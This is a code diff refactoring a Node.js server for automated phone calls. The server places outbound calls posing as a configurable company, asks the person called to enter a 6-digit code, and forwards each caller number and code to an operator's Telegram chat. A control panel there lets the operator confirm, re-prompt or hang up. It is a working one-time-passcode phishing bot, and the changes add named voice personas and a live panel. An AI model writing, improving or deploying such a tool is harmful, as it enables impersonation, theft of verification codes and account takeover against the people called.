@@ -1,26 +1,29 @@
 const express=require("express")
-const fetch=require("node-fetch")
 const bodyParser=require("body-parser")
+const fetch=require("node-fetch")
 
 const app=express()
 app.use(bodyParser.urlencoded({extended:false}))
 app.use(bodyParser.json())
 
-/* ENV */
+const PORT=process.env.PORT||3000
+
+const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
+const CHAT_ID=process.env.CHAT_ID
+
 const SW_PROJECT=process.env.SW_PROJECT
 const SW_TOKEN=process.env.SW_TOKEN
 const SW_SPACE=process.env.SW_SPACE
 const SW_NUMBER=process.env.SW_NUMBER
-const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
-const CHAT_ID=process.env.CHAT_ID
+
 const BASE_URL=process.env.BASE_URL
 
-/* AUTH */
 function auth(){
 return "Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64")
 }
 
 /* SETTINGS */
+
 let settings={
 company:"Support",
 digits:6,
@@ -28,30 +31,39 @@ assistant:0
 }
 
 const assistants=[
-{voice:"Polly.Joanna"},
-{voice:"Polly.Matthew"},
-{voice:"Polly.Amy"},
-{voice:"Polly.Brian"},
-{voice:"Polly.Justin"},
-{voice:"Polly.Kendra"}
+{name:"Nova",voice:"Polly.Joanna"},
+{name:"Lyra",voice:"Polly.Matthew"},
+{name:"Orion",voice:"Polly.Amy"},
+{name:"Astra",voice:"Polly.Brian"},
+{name:"Kairo",voice:"Polly.Justin"},
+{name:"Solara",voice:"Polly.Kendra"}
 ]
 
 /* STATE */
+
 let activeCallSid=null
 let activeCaller=null
 let activeCode=null
 let callStart=null
 let lastCaller=null
+
 let logs=[]
 
-function log(x){
-logs.unshift(new Date().toLocaleTimeString()+" "+x)
-logs=logs.slice(0,20)
+let panelMessageId=null
+
+/* TELEGRAM */
+
+async function tg(method,data){
+return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
+method:"POST",
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify(data)
+}).then(r=>r.json())
 }
 
-/* TELEGRAM SEND */
-async function tgSend(text,buttons){
-let body={
+async function tgSend(text,buttons=null){
+
+const body={
 chat_id:CHAT_ID,
 text:text
 }
@@ -60,15 +72,14 @@ if(buttons){
 body.reply_markup={inline_keyboard:buttons}
 }
 
-await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify(body)
-})
+const res=await tg("sendMessage",body)
+
+return res
 }
 
 /* PANEL */
-async function updatePanel(){
+
+function panelText(){
 
 let status="No active call"
 
@@ -80,16 +91,17 @@ Code: ${activeCode||"waiting"}
 Time: ${secs}s`
 }
 
-let text=
-`📞 IVR Control Panel
+return `📞 IVR Control Panel
 
 ${status}
 
 Company: ${settings.company}
 Digits: ${settings.digits}
-Assistant: ${settings.assistant+1}`
+Assistant: ${assistants[settings.assistant].name}`
+}
 
-await tgSend(text,[
+function panelButtons(){
+return[
 [
 {text:"✔ Confirm",callback_data:"confirm"},
 {text:"🔁 Retry",callback_data:"retry"}
@@ -104,31 +116,42 @@ await tgSend(text,[
 {text:"📊 Status",callback_data:"status"},
 {text:"📜 Logs",callback_data:"logs"}
 ]
-])
+]
 }
 
-/* CALL LAST */
-async function startCall(number){
+async function updatePanel(){
 
-if(!number)return
+const text=panelText()
+const buttons={inline_keyboard:panelButtons()}
 
-await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`,{
-method:"POST",
-headers:{
-Authorization:auth(),
-"Content-Type":"application/x-www-form-urlencoded"
-},
-body:new URLSearchParams({
-From:SW_NUMBER,
-To:number,
-Url:`${BASE_URL}/ivr`
+if(!panelMessageId){
+
+const msg=await tgSend(text,panelButtons())
+
+panelMessageId=msg.result.message_id
+
+}else{
+
+try{
+await tg("editMessageText",{
+chat_id:CHAT_ID,
+message_id:panelMessageId,
+text:text,
+reply_markup:buttons
 })
-})
-
-tgSend("📞 Calling "+number)
+}catch{}
 }
+
+}
+
+/* ROOT */
+
+app.get("/",(req,res)=>{
+res.send("Server running")
+})
 
 /* IVR START */
+
 app.post("/ivr",(req,res)=>{
 
 res.type("text/xml")
@@ -138,12 +161,13 @@ res.send(`
 <Say voice="${assistants[settings.assistant].voice}">
 Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
 </Say>
-<Gather numDigits="${settings.digits}" action="/code"/>
+<Gather numDigits="${settings.digits}" action="${BASE_URL}/code"/>
 </Response>
 `)
 })
 
 /* CODE RECEIVED */
+
 app.post("/code",async(req,res)=>{
 
 const digits=req.body.Digits
@@ -157,22 +181,8 @@ callStart=Date.now()
 
 lastCaller=caller
 
-log("Code received "+digits)
-
-await tgSend(`📞 CODE RECEIVED
-
-Caller: ${caller}
-Code: ${digits}`,[
-[
-{text:"✔ Confirm",callback_data:"confirm"},
-{text:"🔁 Retry",callback_data:"retry"}
-],
-[
-{text:"⛔ Hang Up",callback_data:"hangup"}
-]
-])
-
-await updatePanel()
+logs.unshift(`${caller} : ${digits}`)
+logs=logs.slice(0,10)
 
 res.type("text/xml")
 
@@ -184,9 +194,22 @@ Please wait while we verify your code.
 <Redirect>${BASE_URL}/hold</Redirect>
 </Response>
 `)
+
+setTimeout(async()=>{
+
+await tgSend(`📞 CODE RECEIVED
+
+Caller: ${caller}
+Code: ${digits}`)
+
+updatePanel()
+
+},0)
+
 })
 
 /* HOLD LOOP */
+
 app.post("/hold",(req,res)=>{
 
 res.type("text/xml")
@@ -200,11 +223,13 @@ res.send(`
 })
 
 /* TELEGRAM WEBHOOK */
+
 app.post("/telegram",async(req,res)=>{
 
 const update=req.body
 
-/* BUTTON */
+/* BUTTONS */
+
 if(update.callback_query){
 
 const action=update.callback_query.data
@@ -229,14 +254,12 @@ Thank you. Your code has been confirmed. Have a great day.
 })
 })
 
-log("Confirmed")
-
 activeCallSid=null
 activeCode=null
 callStart=null
 
-tgSend("✔ Code confirmed")
 updatePanel()
+
 }
 
 if(action==="retry"){
@@ -253,15 +276,16 @@ Twiml:`
 <Say voice="${assistants[settings.assistant].voice}">
 Please re-enter your code.
 </Say>
-<Gather numDigits="${settings.digits}" action="/code"/>
+<Gather numDigits="${settings.digits}" action="${BASE_URL}/code"/>
 </Response>
 `
 })
 })
 
-log("Retry requested")
+activeCode=null
 
-tgSend("🔁 Asked caller to re-enter code")
+updatePanel()
+
 }
 
 if(action==="hangup"){
@@ -277,14 +301,12 @@ Twiml:`<Response><Hangup/></Response>`
 })
 })
 
-log("Call ended")
-
 activeCallSid=null
 activeCode=null
 callStart=null
 
-tgSend("⛔ Call ended")
 updatePanel()
+
 }
 
 if(action==="calllast"){
@@ -296,56 +318,96 @@ updatePanel()
 }
 
 if(action==="logs"){
-let t="📜 Logs\n\n"
-logs.forEach(l=>t+=l+"\n")
-tgSend(t)
+
+let text="📜 Logs\n\n"
+
+logs.forEach(l=>{
+text+=l+"\n"
+})
+
+tgSend(text)
 }
 
 }
 
 /* COMMANDS */
+
 if(update.message){
 
 const text=update.message.text
 
 if(text.startsWith("/digits")){
+
 const d=parseInt(text.split(" ")[1])
-if(d>=2&&d<=10){
+
+if(d>=2 && d<=10){
 settings.digits=d
-tgSend("Digits set to "+d)
 updatePanel()
 }
+
 }
 
 if(text.startsWith("/assistant")){
+
 const a=parseInt(text.split(" ")[1])
-if(a>=1&&a<=assistants.length){
+
+if(a>=1 && a<=assistants.length){
 settings.assistant=a-1
-tgSend("Assistant set to "+a)
 updatePanel()
 }
+
 }
 
 if(text.startsWith("/company")){
+
 settings.company=text.replace("/company ","")
-tgSend("Company name updated")
+
 updatePanel()
+
 }
 
 if(text==="/panel"){
+panelMessageId=null
 updatePanel()
 }
 
 }
 
 res.sendStatus(200)
+
 })
 
-/* ROOT */
-app.get("/",(req,res)=>{
-res.send("Server running")
+/* START CALL */
+
+async function startCall(number){
+
+if(!number)return
+
+await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`,{
+method:"POST",
+headers:{
+Authorization:auth(),
+"Content-Type":"application/x-www-form-urlencoded"
+},
+body:new URLSearchParams({
+From:SW_NUMBER,
+To:number,
+Url:`${BASE_URL}/ivr`
+})
 })
 
-/* SERVER */
-const PORT=process.env.PORT||3000
-app.listen(PORT,()=>console.log("Server started"))
+}
+
+/* LIVE PANEL UPDATE */
+
+setInterval(()=>{
+
+if(panelMessageId){
+updatePanel()
+}
+
+},1000)
+
+app.listen(PORT,()=>{
+console.log("Server started")
+})
